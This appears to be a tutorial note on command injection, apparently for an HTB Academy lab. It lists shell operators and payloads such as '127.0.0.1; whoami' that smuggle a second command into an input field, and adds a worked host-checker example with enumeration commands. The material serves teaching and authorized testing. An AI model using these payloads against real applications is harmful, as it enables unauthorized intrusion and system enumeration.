# 🛰️ Command Injection Techniques

## Overview [!ABSTRACT]
Command injection vulnerabilities occur when an application allows attackers to inject arbitrary commands into system utilities like `ping`, `nslookup`, and others. This document outlines various methods to test for command injection using different operators on various platforms.

---

### Universal Operators [!INFO]
These work across all platforms (Linux, Windows, macOS):

- `;`
- `\n` 
- `&`
- `|`
- `&&`
- `||`

#### Example Payloads
```bash
# Test with semicolon
original_input; whoami

# Test with AND operator  
original_input && whoami

# Test with pipe
original_input | whoami

# Test with OR operator
original_input || whoami

# Test with ampersand (background process)
original_input & whoami

# Test with newline
original_input\nwhoami
```

---

## Unix-Only Operators [!INFO]
These work on Linux and macOS only:

### Sub-Shell Backticks (` `) [!EXAMPLE]
```bash
# Example payload
127.0.0.1; `whoami`
```

### Sub-Shell Modern ($()) [!EXAMPLE]
```bash
# Example payload
127.0.0.1; $(whoami)
```

---

## Platform Compatibility [!INFO]

### Windows CMD Limitations
Semicolon may not work in CMD:
```cmd
ping -c 1 127.0.0.1; whoami  # May fail

# Use && or || instead
ping -c 1 127.0.0.1 && whoami  # Works
```

### PowerShell Compatibility
All operators work in PowerShell:
```powershell
ping -c 1 127.0.0.1; whoami  # Works
ping -c 1 127.0.0.1 && whoami  # Works
```

### Linux/Unix Full Support
All operators supported:
```bash
# Simple semicolon injection
ping -c 1 127.0.0.1; whoami     # Works

# AND operator 
ping -c 1 127.0.0.1 && whoami   # Works  

# Pipe operator
ping -c 1 127.0.0.1 | whoami    # Works

# Backtick (command substitution)
ping -c 1 127.0.0.1 `whoami`    # Works

# Sub-shell modern syntax 
ping -c 1 127.0.0.1 $(whoami)   # Works
```

---

## Detection Methodology [!INFO]

### Step 1: Identify Input Points [!CHECK]
**Common Vulnerable Parameters:**
- IP address fields
- Filename inputs
- System utilities (ping, nslookup, traceroute)
- File processing functions
- Search functionality
- Configuration settings

### Step 2: Test Basic Injection [!SUCCESS]
**Simple Test Payloads:**
```bash
# Test with semicolon
original_input; whoami

# Test with AND operator  
original_input && whoami

# Test with pipe
original_input | whoami
```

### Step 3: Analyze Response Changes [!WARNING]
**Positive Indicators:**
- Additional command output appears
- Error messages change
- Response timing differences
- Different HTTP status codes

**Example Response Analysis:**
```bash
# Normal ping response
PING 127.0.0.1 (127.0.0.1): 56 data bytes  
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.074 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss

# Injected command response
PING 127.0.0.1 (127.0.0.1): 56 data bytes  
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.074 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
www-data
```

### Step 4: Confirm Injection [!SUCCESS]
**Verification Commands:**
```bash
# System information
whoami
id
hostname
pwd

# Directory listing
ls
dir

# System details
uname -a
systeminfo
```

---

## Detection Tips [!INFO]

### Best Practices [!CHECK]
1. **Start Simple:** Begin with basic operators.
2. **Use Safe Commands:** Non-destructive verification commands.
3. **Test Multiple Operators:** Try different injection methods.
4. **URL Encoding:** Remember to URL-encode for web requests.

### Common Pitfalls [!DANGER]
- Don't use destructive commands during detection.
- Don't ignore URL encoding requirements.
- Don't test only one injection operator.
- Don't forget platform-specific limitations.

---

## Practical Example [!EXAMPLE]

### Host Checker Exploitation

**Target:** IP address input field in ping utility

#### Detection Process:

1. **Normal Input:**
```bash
Input: 127.0.0.1  
Output: PING 127.0.0.1 ... (normal ping response)
```

2. **Injection Test:**
```bash
Input: 127.0.0.1; whoami 
Output: PING 127.0.0.1 ... (ping response)  
        www-data (injection successful!)
```

3. **Verification:** 
```bash
Input: 127.0.0.1 && id
Output: PING 127.0.0.1 ... (ping response)
        uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

4. **System Enumeration:** 
```bash
Input: 127.0.0.1; uname -a  
Output: PING 127.0.0.1 ... (ping response)
        Linux target 5.4.0-74-generic #83-Ubuntu SMP
```

---

## Lab Exercise [!EXAMPLE]

### HTB Academy Challenge

**Target:** Host Checker utility at provided IP:PORT

#### Task:
Try adding injection operators after the IP in the input field.

#### Detection Question:
What did the error message say when using injection operators?

#### Testing Approach:
1. Try each injection operator systematically.
2. Note any error messages or changed responses.  
3. Document which operators trigger different behavior.
4. Identify successful injection indicators.

**Expected Workflow:**
```bash
# Test basic injection operators
127.0.0.1; whoami
127.0.0.1 && whoami  
127.0.0.1 || whoami
127.0.0.1 | whoami
127.0.0.1 & whoami
```

**Success Indicators:**
- Additional command output appears.
- Error messages mention injected commands.
- Response structure changes.
- Different timing in responses.

Remember: The goal is to confirm whether the application is vulnerable to command injection through systematic testing of injection operators.